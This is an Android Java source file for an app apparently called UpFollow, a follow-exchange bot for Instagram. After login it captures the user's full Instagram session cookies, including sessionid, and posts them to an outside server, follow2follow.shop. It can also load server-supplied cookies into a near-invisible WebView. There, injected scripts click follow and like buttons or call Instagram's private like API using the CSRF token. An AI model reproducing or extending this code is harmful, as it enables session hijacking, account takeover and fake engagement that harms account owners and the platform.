package com.upfollow.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

public class MainActivity extends Activity {

    private WebView mainWebView;
    private WebView workerWebView;

    private static final String HOSTING_BASE = "https://follow2follow.shop/";
    private static final String HOSTING_DASHBOARD = HOSTING_BASE + "index.php";
    private static final String IG_URL = "https://www.instagram.com";
    private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36";

    private static final String CHANNEL_ID = "upfollow_automation_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final long TASK_TIMEOUT_MS = 40000L;

    private NotificationManager notificationManager;
    private PowerManager.WakeLock wakeLock;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());

    private volatile String mainUrl = "";
    private String deviceKey = "";

    private String currentTaskType = "follow";
    private boolean taskActive = false;

    // Instagram login capture state
    private boolean captureBusy = false;
    private boolean addMode = false;
    private String captureNonce = "";
    private String captureCookies = "";

    private final Runnable taskTimeout = new Runnable() {
        @Override
        public void run() {
            deliverResult(false, "Timeout");
        }
    };

    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        deviceKey = computeDeviceKey();

        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UpFollow:WakeLock");
            }
        } catch (Exception ignored) {}

        createNotificationChannel();
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, 101);
            }
        }

        mainWebView = findViewById(R.id.webView);
        setupWebView(mainWebView);

        // Worker WebView: full-size, main WebView ke neeche chhupa hua
        workerWebView = new WebView(this);
        setupWebView(workerWebView);
        workerWebView.setLayoutParams(new FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
        workerWebView.setAlpha(0.01f);
        ViewGroup rootView = (ViewGroup) findViewById(android.R.id.content);
        if (rootView != null) {
            rootView.addView(workerWebView, 0);
        }

        // Bridges
        mainWebView.addJavascriptInterface(new MainAppInterface(), "Android");
        mainWebView.addJavascriptInterface(new IgProbeInterface(), "IgProbe");
        workerWebView.addJavascriptInterface(new WorkerAppInterface(), "WorkerBridge");

        // ---------- Main WebView client ----------
        mainWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return handleNav(request.getUrl().toString());
            }

            @SuppressWarnings("deprecation")
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return handleNav(url);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                mainUrl = url == null ? "" : url;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (url != null) mainUrl = url;
                checkInstagramLogin(url);
            }
        });

        // ---------- Worker WebView client ----------
        workerWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(final WebView view, String url) {
                super.onPageFinished(view, url);
                if (!taskActive || url == null) return;

                String path = "";
                try { path = String.valueOf(Uri.parse(url).getPath()).toLowerCase(); } catch (Exception ignored) {}

                if (path.startsWith("/accounts/suspended")) {
                    deliverResult(false, "Suspended: Instagram suspended this account");
                    return;
                }
                if (path.startsWith("/accounts/disabled")) {
                    deliverResult(false, "Disabled: Instagram disabled this account");
                    return;
                }
                if (path.startsWith("/challenge") || path.startsWith("/checkpoint") || path.startsWith("/auth_platform")) {
                    deliverResult(false, "Blocked: Challenge / Checkpoint");
                    return;
                }
                if (path.startsWith("/accounts/login") || path.startsWith("/accounts/emailsignup")) {
                    deliverResult(false, "Session expired");
                    return;
                }

                uiHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (!taskActive) return;
                        if ("like".equalsIgnoreCase(currentTaskType)) {
                            injectLikeScript(view);
                        } else {
                            injectFollowScript(view);
                        }
                    }
                }, 1200);
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                super.onReceivedError(view, request, error);
                if (request != null && request.isForMainFrame()) {
                    deliverResult(false, "Page error");
                }
            }
        });

        // App start: hamesha dashboard (server decide karta hai: dashboard / saved accounts / login)
        mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
    }

    private void setupWebView(WebView wv) {
        WebSettings s = wv.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setUserAgentString(USER_AGENT);

        CookieManager cm = CookieManager.getInstance();
        cm.setAcceptCookie(true);
        cm.setAcceptThirdPartyCookies(wv, true);
    }

    // ------------------------------------------------------------------
    // Device key (reinstall ke baad saved accounts pehchanne ke liye)
    // ------------------------------------------------------------------
    private String computeDeviceKey() {
        try {
            String aid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            if (aid == null) aid = "unknown";
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest((aid + ":upfollow").getBytes("UTF-8"));
            StringBuilder sb = new StringBuilder();
            for (byte b : d) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) {
            return "0000000000000000000000000000000000000000000000000000000000000000";
        }
    }

    // ------------------------------------------------------------------
    // Navigation: "Add Account" link ko yaha pakadte hain
    // ------------------------------------------------------------------
    private boolean handleNav(final String url) {
        if (url != null && url.contains("force_authentication=1")) {
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    addMode = true;
                    captureBusy = false;
                    applyInstagramCookies("");
                    mainWebView.loadUrl(IG_LOGIN_URL);
                }
            });
            return true;
        }
        return false;
    }

    // ------------------------------------------------------------------
    // Instagram login capture (main WebView)
    // ------------------------------------------------------------------
    private void checkInstagramLogin(String url) {
        if (url == null || captureBusy) return;
        if (!url.startsWith(IG_URL)) return;

        String path = "";
        try { path = String.valueOf(Uri.parse(url).getPath()).toLowerCase(); } catch (Exception ignored) {}
        String[] bad = {"login", "challenge", "checkpoint", "suspended", "disabled",
                "signup", "two_factor", "password", "recover", "auth_platform"};
        for (String b : bad) {
            if (path.contains(b)) return;
        }

        String cookies = CookieManager.getInstance().getCookie(IG_URL);
        if (cookieValue(cookies, "sessionid").isEmpty()) return;

        captureBusy = true;
        captureCookies = cookies;
        captureNonce = Long.toHexString(System.nanoTime());
        final String nonce = captureNonce;
        String uid = cookieValue(cookies, "ds_user_id");

        if (uid.matches("\\d+")) {
            String js = "(function(){var n='" + nonce + "';"
                    + "function d(u){try{IgProbe.onIgInfo(n,u||'');}catch(e){}}"
                    + "try{fetch('/api/v1/users/" + uid + "/info/',{credentials:'include',"
                    + "headers:{'x-ig-app-id':'936619743392459','x-requested-with':'XMLHttpRequest'}})"
                    + ".then(function(r){return r.json();})"
                    + ".then(function(j){d(j&&j.user&&j.user.username);})"
                    + ".catch(function(){d('');});}catch(e){d('');}})();";
            mainWebView.evaluateJavascript(js, null);
        } else {
            finishCapture("");
            return;
        }

        uiHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (captureBusy && nonce.equals(captureNonce)) {
                    finishCapture("");
                }
            }
        }, 6000);
    }

    private void finishCapture(String username) {
        if (!captureBusy) return;
        captureBusy = false;
        captureNonce = "";
        try {
            String clean = username == null ? "" : username.replaceAll("[^A-Za-z0-9._]", "");
            String body = "ig_cookies=" + URLEncoder.encode(captureCookies, "UTF-8")
                    + "&ig_name=" + URLEncoder.encode(clean, "UTF-8")
                    + "&dk=" + deviceKey
                    + "&mode=" + (addMode ? "add" : "login");
            addMode = false;
            mainWebView.postUrl(HOSTING_DASHBOARD, body.getBytes("UTF-8"));
        } catch (Exception e) {
            addMode = false;
            mainWebView.loadUrl(HOSTING_DASHBOARD + "?dk=" + deviceKey);
        }
    }

    // ------------------------------------------------------------------
    // Cookie helpers
    // ------------------------------------------------------------------
    private static String cookieValue(String cookies, String name) {
        if (cookies == null) return "";
        for (String part : cookies.split(";")) {
            part = part.trim();
            int i = part.indexOf('=');
            if (i > 0 && part.substring(0, i).equals(name)) {
                return part.substring(i + 1);
            }
        }
        return "";
    }

    private void applyInstagramCookies(String cookieStr) {
        CookieManager cm = CookieManager.getInstance();
        String existing = cm.getCookie(IG_URL);
        if (existing != null) {
            for (String part : existing.split(";")) {
                String p = part.trim();
                int i = p.indexOf('=');
                String name = i > 0 ? p.substring(0, i) : p;
                if (name.isEmpty()) continue;
                cm.setCookie(IG_URL, name + "=; Max-Age=0; Path=/; Domain=.instagram.com");
                cm.setCookie(IG_URL, name + "=; Max-Age=0; Path=/");
            }
        }
        if (cookieStr != null && !cookieStr.isEmpty()) {
            for (String part : cookieStr.split(";")) {
                String p = part.trim();
                int i = p.indexOf('=');
                if (i <= 0) continue;
                String name = p.substring(0, i);
                String extra = "; Domain=.instagram.com; Path=/; Secure";
                if ("sessionid".equals(name)) extra += "; HttpOnly";
                cm.setCookie(IG_URL, p + extra);
            }
        }
        cm.flush();
    }

    private boolean trusted() {
        String u = mainUrl;
        return u != null && u.startsWith(HOSTING_BASE);
    }

    // ------------------------------------------------------------------
    // Result delivery (ek task = ek result)
    // ------------------------------------------------------------------
    private void deliverResult(boolean success, String message) {
        if (!taskActive) return;
        taskActive = false;
        uiHandler.removeCallbacks(taskTimeout);
        String safe = message == null ? "" : message.replace("\\", "\\\\").replace("'", "\\'");
        mainWebView.evaluateJavascript(
                "if(window.onWorkerResult) window.onWorkerResult(" + success + ", '" + safe + "');", null);
    }

    private static String js(String... lines) {
        StringBuilder sb = new StringBuilder();
        for (String l : lines) sb.append(l).append('\n');
        return sb.toString();
    }

    // ------------------------------------------------------------------
    // Shared JS helpers (fatal state detection, popups)
    // ------------------------------------------------------------------
    private static final String JS_HEAD = js(
        "(function() {",
        "  if (window.__ufRunning) return;",
        "  window.__ufRunning = true;",
        "  var finished = false, timer = null, tries = 0, clicked = false, clickedAt = 0;",
        "  function finish(ok, msg) {",
        "    if (finished) return;",
        "    finished = true; window.__ufRunning = false;",
        "    if (timer) clearInterval(timer);",
        "    window.WorkerBridge.onTaskResult(ok, msg);",
        "  }",
        "  function txt(e) { return ((e.innerText || e.textContent) || '').trim().toLowerCase(); }",
        "  function lbl(e) { return (e.getAttribute('aria-label') || '').trim().toLowerCase(); }",
        "  function btns(root) { return Array.prototype.slice.call((root || document).querySelectorAll('button, div[role=button], span[role=button], a[role=button]')); }",
        "  function bodyText() { return (document.body ? document.body.innerText : '').toLowerCase(); }",
        "  function fatal() {",
        "    var p = location.pathname || '';",
        "    if (p.indexOf('/accounts/suspended') === 0) return 'Suspended: Instagram suspended this account';",
        "    if (p.indexOf('/accounts/disabled') === 0) return 'Disabled: Instagram disabled this account';",
        "    if (p.indexOf('/challenge') === 0 || p.indexOf('/checkpoint') === 0 || p.indexOf('/auth_platform') === 0) return 'Blocked: Challenge / Checkpoint';",
        "    if (p.indexOf('/accounts/login') === 0 || p.indexOf('/accounts/emailsignup') === 0) return 'Session expired';",
        "    var t = bodyText();",
        "    if (t.indexOf('account has been disabled') > -1 || t.indexOf('account was disabled') > -1) return 'Disabled: Instagram disabled this account';",
        "    if (t.indexOf('account has been suspended') > -1 || t.indexOf('suspended your account') > -1 || t.indexOf('account is suspended') > -1) return 'Suspended: Instagram suspended this account';",
        "    if (t.indexOf('action blocked') > -1 || t.indexOf('confirm you') > -1 || t.indexOf('try again later') > -1 || t.indexOf('we restrict certain activity') > -1) return 'Blocked: Action Limit / Challenge';",
        "    return null;",
        "  }",
        "  function gone() {",
        "    var t = bodyText();",
        "    return (t.indexOf('page isn') > -1 && t.indexOf('available') > -1) || t.indexOf('content isn') > -1 && t.indexOf('available') > -1;",
        "  }",
        "  function dismiss() {",
        "    var w = ['not now', 'allow all cookies', 'allow essential and optional cookies', 'accept all'];",
        "    btns().forEach(function(b) { if (w.indexOf(txt(b)) > -1) b.click(); });",
        "  }"
    );

    // ------------------------------------------------------------------
    // FOLLOW SCRIPT
    // ------------------------------------------------------------------
    private void injectFollowScript(WebView view) {
        String script = JS_HEAD + js(
            "  var FOLLOW = ['follow', 'follow back', '\u092b\u0949\u0932\u094b \u0915\u0930\u0947\u0902'];",
            "  var DONE = ['following', 'requested'];",
            "  function find(list, words) {",
            "    for (var i = 0; i < list.length; i++) { if (words.indexOf(txt(list[i])) > -1) return list[i]; }",
            "    return null;",
            "  }",
            "  function tick() {",
            "    try {",
            "      tries++;",
            "      var f = fatal(); if (f) { finish(false, f); return; }",
            "      if (gone()) { finish(false, 'Profile unavailable'); return; }",
            "      dismiss();",
            "      var scope = (tries > 8) ? document : (document.querySelector('header') || document.querySelector('main') || document);",
            "      var list = btns(scope);",
            "      if (clicked) {",
            "        if (find(list, DONE)) { finish(true, 'Followed Successfully'); return; }",
            "        if (Date.now() - clickedAt > 6000) { finish(false, 'Click did not register'); }",
            "        return;",
            "      }",
            "      if (find(list, DONE)) { finish(true, 'Already Following'); return; }",
            "      var fb = find(list, FOLLOW);",
            "      if (fb) { fb.click(); clicked = true; clickedAt = Date.now(); return; }",
            "      if (tries >= 22) { finish(false, 'Follow button not found'); }",
            "    } catch (err) { finish(false, 'JS Error: ' + err.message); }",
            "  }",
            "  timer = setInterval(tick, 700);",
            "  tick();",
            "})();"
        );
        view.evaluateJavascript(script, null);
    }

    // ------------------------------------------------------------------
    // LIKE SCRIPT
    // ------------------------------------------------------------------
    private void injectLikeScript(WebView view) {
        String script = JS_HEAD + js(
            "  var LIKE = ['like', '\u092a\u0938\u0902\u0926 \u0915\u0930\u0947\u0902', 'me gusta', 'curtir', 'mi piace', 'suka', 'gef\u00e4llt mir'];",
            "  var UNLIKE = ['unlike', '\u092a\u0938\u0902\u0926 \u0930\u0926\u094d\u0926 \u0915\u0930\u0947\u0902', 'ya no me gusta', 'descurtir', 'batal suka', 'gef\u00e4llt mir nicht mehr'];",
            "  var apiTried = false, apiBusy = false;",
            "  function byLabel(set) {",
            "    var els = document.querySelectorAll('svg[aria-label], [role=button][aria-label], button[aria-label]');",
            "    for (var i = 0; i < els.length; i++) {",
            "      if (set.indexOf(lbl(els[i])) > -1) {",
            "        var r = els[i].getBoundingClientRect();",
            "        if (r.width > 0 && r.height > 0) return els[i];",
            "      }",
            "    }",
            "    return null;",
            "  }",
            "  function cookie(name) {",
            "    var c = (document.cookie || '').split(';');",
            "    for (var i = 0; i < c.length; i++) { var p = c[i].trim(); if (p.indexOf(name + '=') === 0) return p.substring(name.length + 1); }",
            "    return '';",
            "  }",
            "  function callApi() {",
            "    apiTried = true;",
            "    var parts = (location.pathname || '').split('/'), sc = '';",
            "    for (var i = 0; i < parts.length - 1; i++) {",
            "      if (parts[i] === 'p' || parts[i] === 'reel' || parts[i] === 'reels' || parts[i] === 'tv') { sc = parts[i + 1]; break; }",
            "    }",
            "    var csrf = cookie('csrftoken');",
            "    if (!sc || !csrf || typeof BigInt === 'undefined') return;",
            "    var a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';",
            "    var id = BigInt(0); sc = sc.slice(0, 11);",
            "    for (var j = 0; j < sc.length; j++) { id = id * BigInt(64) + BigInt(a.indexOf(sc.charAt(j))); }",
            "    apiBusy = true;",
            "    fetch('/api/v1/web/likes/' + id.toString() + '/like/', {",
            "      method: 'POST', credentials: 'include',",
            "      headers: { 'x-csrftoken': csrf, 'x-ig-app-id': '936619743392459', 'x-requested-with': 'XMLHttpRequest', 'content-type': 'application/x-www-form-urlencoded' },",
            "      body: ''",
            "    }).then(function(r) { return r.text().then(function(t) { return { s: r.status, t: t }; }); })",
            "    .then(function(x) {",
            "      apiBusy = false;",
            "      var low = x.t.toLowerCase().split(' ').join('');",
            "      if (x.s === 200 && low.indexOf('\"status\":\"ok\"') > -1) { finish(true, 'Post Liked Successfully'); return; }",
            "      if (low.indexOf('checkpoint') > -1 || low.indexOf('challenge') > -1) { finish(false, 'Blocked: Challenge / Checkpoint'); return; }",
            "      if (low.indexOf('login_required') > -1) { finish(false, 'Session expired'); return; }",
            "      if (low.indexOf('feedback_required') > -1 || x.s === 429 || low.indexOf('\"spam\":true') > -1 || low.indexOf('trylater') > -1) { finish(false, 'Blocked: Action Limit / Challenge'); return; }",
            "      if (x.s === 404) { finish(false, 'Post unavailable'); return; }",
            "    }).catch(function() { apiBusy = false; });",
            "  }",
            "  function tick() {",
            "    try {",
            "      tries++;",
            "      var f = fatal(); if (f) { finish(false, f); return; }",
            "      if (gone()) { finish(false, 'Post unavailable'); return; }",
            "      dismiss();",
            "      if (apiBusy) return;",
            "      if (byLabel(UNLIKE)) { finish(true, clicked ? 'Post Liked Successfully' : 'Already Liked'); return; }",
            "      if (clicked) {",
            "        if (Date.now() - clickedAt > 6000) { finish(false, 'Like did not register'); }",
            "        return;",
            "      }",
            "      var lk = byLabel(LIKE);",
            "      if (lk) {",
            "        var b = lk.closest('button, [role=button]') || lk.parentElement;",
            "        b.click(); clicked = true; clickedAt = Date.now(); return;",
            "      }",
            "      if (!apiTried && tries >= 4) { callApi(); return; }",
            "      if (tries >= 24) { finish(false, 'Like button not found'); }",
            "    } catch (err) { finish(false, 'JS Error: ' + err.message); }",
            "  }",
            "  timer = setInterval(tick, 700);",
            "  tick();",
            "})();"
        );
        view.evaluateJavascript(script, null);
    }

    // ------------------------------------------------------------------
    // Notification
    // ------------------------------------------------------------------
    private void createNotificationChannel() {
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Automation Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Shows live automation stats in status bar");
            channel.setShowBadge(false);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    private void showOrUpdateNotification(int accounts, int tasks, int coins) {
        if (notificationManager == null) return;
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setContentTitle("UpFollow Running")
               .setContentText("Accounts: " + accounts + " Active  |  Tasks: " + tasks + "  |  Coins: +" + coins)
               .setSmallIcon(android.R.drawable.stat_notify_sync)
               .setOngoing(true);
        notificationManager.notify(NOTIFICATION_ID, builder.build());
    }

    private void clearAutomationNotification() {
        if (notificationManager != null) {
            notificationManager.cancel(NOTIFICATION_ID);
        }
    }

    // ------------------------------------------------------------------
    // Bridges
    // ------------------------------------------------------------------
    public class MainAppInterface {

        @JavascriptInterface
        public void runTask(final String target, final String taskType, final String mediaId, final String cookieStr) {
            if (!trusted()) return;
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    currentTaskType = taskType;
                    taskActive = true;
                    uiHandler.removeCallbacks(taskTimeout);
                    uiHandler.postDelayed(taskTimeout, TASK_TIMEOUT_MS);

                    if (cookieStr != null && !cookieStr.isEmpty()) {
                        applyInstagramCookies(cookieStr);
                    }

                    String cleanTarget = target == null ? "" : target.replaceAll("[^A-Za-z0-9._]", "");
                    String url;
                    if ("like".equalsIgnoreCase(taskType)) {
                        if (mediaId != null && mediaId.startsWith("https://www.instagram.com/")) {
                            url = mediaId;
                        } else if (mediaId != null && !mediaId.isEmpty() && mediaId.matches("[A-Za-z0-9_-]+") && !mediaId.equals("25025320")) {
                            url = (mediaId.length() <= 12 ? "https://www.instagram.com/reel/" : "https://www.instagram.com/p/") + mediaId + "/";
                        } else {
                            url = "https://www.instagram.com/" + cleanTarget + "/";
                        }
                    } else {
                        url = "https://www.instagram.com/" + cleanTarget + "/";
                    }
                    workerWebView.loadUrl(url);
                }
            });
        }

        @JavascriptInterface
        public void executeBrowserAction(String target, String taskType, String mediaId) {
            runTask(target, taskType, mediaId, "");
        }

        @JavascriptInterface
        public void executeBrowserFollow(String target) {
            runTask(target, "follow", "", "");
        }

        @JavascriptInterface
        public String getIgCookies() {
            if (!trusted()) return "";
            String c = CookieManager.getInstance().getCookie(IG_URL);
            return c == null ? "" : c;
        }

        @JavascriptInterface
        public void setKeepScreenOn(final boolean keepOn) {
            if (!trusted()) return;
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (keepOn) {
                        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                        if (wakeLock != null && !wakeLock.isHeld()) {
                            wakeLock.acquire(12 * 60 * 60 * 1000L);
                        }
                    } else {
                        getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                        if (wakeLock != null && wakeLock.isHeld()) {
                            wakeLock.release();
                        }
                    }
                }
            });
        }

        @JavascriptInterface
        public void updateNotification(final int accounts, final int tasks, final int coins) {
            if (!trusted()) return;
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    showOrUpdateNotification(accounts, tasks, coins);
                }
            });
        }

        @JavascriptInterface
        public void stopNotification() {
            if (!trusted()) return;
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    clearAutomationNotification();
                }
            });
        }

        // REAL-TIME LIVE SEARCH — WebView JS fetch (session cookies automatic milti hain)
        @JavascriptInterface
        public void searchInstagramProfileLive(final String queryUsername) {
            uiHandler.post(() -> {
                String cleanUser = queryUsername.replace("@", "").trim();
                // workerWebView se fetch karo — iske paas Instagram session cookies hain
                String js = "(function() {"
                    + "  var u = '" + cleanUser.replace("'", "\\'") + "';"
                    + "  fetch('https://www.instagram.com/api/v1/users/web_profile_info/?username=' + encodeURIComponent(u), {"
                    + "    method: 'GET',"
                    + "    credentials: 'include',"
                    + "    headers: {"
                    + "      'X-IG-App-ID': '936619743392459',"
                    + "      'X-Requested-With': 'XMLHttpRequest',"
                    + "      'Accept': '*/*'"
                    + "    }"
                    + "  })"
                    + "  .then(function(r) { return r.text().then(function(t) { return {s: r.status, b: t}; }); })"
                    + "  .then(function(x) {"
                    + "    try {"
                    + "      var d = JSON.parse(x.b);"
                    + "      var user = (d.data && d.data.user) ? d.data.user : (d.user ? d.user : null);"
                    + "      if (x.s === 200 && user && user.username) {"
                    + "        var fc = 0;"
                    + "        if (user.edge_followed_by && user.edge_followed_by.count !== undefined) fc = user.edge_followed_by.count;"
                    + "        else if (user.follower_count !== undefined) fc = user.follower_count;"
                    + "        var ff = fc >= 1000000 ? (fc/1000000).toFixed(1).replace(/\\.0$/,'') + 'M' : fc >= 1000 ? (fc/1000).toFixed(1).replace(/\\.0$/,'') + 'K' : '' + fc;"
                    + "        var pic = user.profile_pic_url_hd || user.profile_pic_url || '';"
                    + "        var nid = user.pk || user.id || '';"
                    + "        var result = JSON.stringify({success:true, username:user.username, full_name:user.full_name||'', numeric_id:''+nid, follower_count:fc, followers_formatted:ff+' followers', is_verified:!!user.is_verified, profile_pic:pic});"
                    + "        WorkerBridge.onSearchResult(result);"
                    + "      } else {"
                    + "        WorkerBridge.onSearchResult(JSON.stringify({success:false, message:'HTTP ' + x.s}));"
                    + "      }"
                    + "    } catch(e) {"
                    + "      WorkerBridge.onSearchResult(JSON.stringify({success:false, message:'Parse: ' + e.message}));"
                    + "    }"
                    + "  })"
                    + "  .catch(function(e) { WorkerBridge.onSearchResult(JSON.stringify({success:false, message:'Fetch: ' + e.message})); });"
                    + "})();";
                workerWebView.loadUrl("https://www.instagram.com/");
                // Instagram load hone ke baad fetch chalao
                workerWebView.setWebViewClient(new WebViewClient() {
                    @Override
                    public void onPageFinished(WebView view, String url) {
                        if (url != null && url.contains("instagram.com")) {
                            view.evaluateJavascript(js, null);
                            // Worker client wapas original pe set karo
                            uiHandler.postDelayed(() -> setupWorkerClient(), 15000);
                        }
                    }
                });
            });
        }

        private void setupWorkerClient() {
            workerWebView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(final WebView view, String url) {
                    super.onPageFinished(view, url);
                    if (!taskActive || url == null) return;
                    String path = "";
                    try { path = String.valueOf(Uri.parse(url).getPath()).toLowerCase(); } catch (Exception ignored) {}
                    if (path.startsWith("/accounts/suspended")) { deliverResult(false, "Suspended: Instagram suspended this account"); return; }
                    if (path.startsWith("/accounts/disabled")) { deliverResult(false, "Disabled: Instagram disabled this account"); return; }
                    if (path.startsWith("/challenge") || path.startsWith("/checkpoint") || path.startsWith("/auth_platform")) { deliverResult(false, "Blocked: Challenge / Checkpoint"); return; }
                    if (path.startsWith("/accounts/login") || path.startsWith("/accounts/emailsignup")) { deliverResult(false, "Session expired"); return; }
                    uiHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (!taskActive) return;
                            if ("like".equalsIgnoreCase(currentTaskType)) { injectLikeScript(view); } else { injectFollowScript(view); }
                        }
                    }, 1200);
                }
                @Override
                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    if (request != null && request.isForMainFrame()) deliverResult(false, "Page error");
                }
            });
        }

        private String extractJson(String json, String key) {
            try {
                int ki = json.indexOf(key);
                if (ki < 0) return "";
                int colon = json.indexOf(':', ki + key.length());
                if (colon < 0) return "";
                int start = colon + 1;
                while (start < json.length() && (json.charAt(start) == ' ' || json.charAt(start) == '\t')) start++;
                if (start >= json.length()) return "";
                char first = json.charAt(start);
                if (first == '"') {
                    int end = start + 1;
                    while (end < json.length()) {
                        if (json.charAt(end) == '"' && json.charAt(end - 1) != '\\') break;
                        end++;
                    }
                    return json.substring(start + 1, end);
                } else {
                    int end = start;
                    while (end < json.length()) {
                        char c = json.charAt(end);
                        if (c == ',' || c == '}' || c == ']' || c == '\n' || c == '\r') break;
                        end++;
                    }
                    return json.substring(start, end).trim();
                }
            } catch (Exception e) {
                return "";
            }
        }

        private String formatCount(long count) {
            if (count >= 1_000_000) {
                double m = count / 1_000_000.0;
                return (m == (long) m ? String.valueOf((long) m) : String.format("%.1f", m)) + "M";
            } else if (count >= 1_000) {
                double k = count / 1_000.0;
                return (k == (long) k ? String.valueOf((long) k) : String.format("%.1f", k)) + "K";
            }
            return String.valueOf(count);
        }

        private String escJ(String s) {
            if (s == null) return "";
            return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "").replace("\r", "");
        }
    }

    // Instagram page se sirf username lene ke liye (nonce ke bina kaam nahi karta)
    public class IgProbeInterface {
        @JavascriptInterface
        public void onIgInfo(final String nonce, final String username) {
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    if (captureBusy && nonce != null && nonce.equals(captureNonce)) {
                        finishCapture(username);
                    }
                }
            });
        }
    }

    public class WorkerAppInterface {
        @JavascriptInterface
        public void onTaskResult(final boolean success, final String message) {
            uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    deliverResult(success, message);
                }
            });
        }

        @JavascriptInterface
        public void onSearchResult(final String jsonResult) {
            uiHandler.post(() -> {
                String safe = jsonResult.replace("\\", "\\\\").replace("'", "\\'");
                mainWebView.evaluateJavascript(
                    "if(window.onInstagramLiveSearchResult) window.onInstagramLiveSearchResult(true, '" + safe + "');", null);
                // Worker client wapas original pe restore karo
                new MainAppInterface().setupWorkerClient();
            });
        }
    }

    @Override
    public void onBackPressed() {
        if (mainWebView.canGoBack()) {
            mainWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        uiHandler.removeCallbacksAndMessages(null);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        super.onDestroy();
    }
}
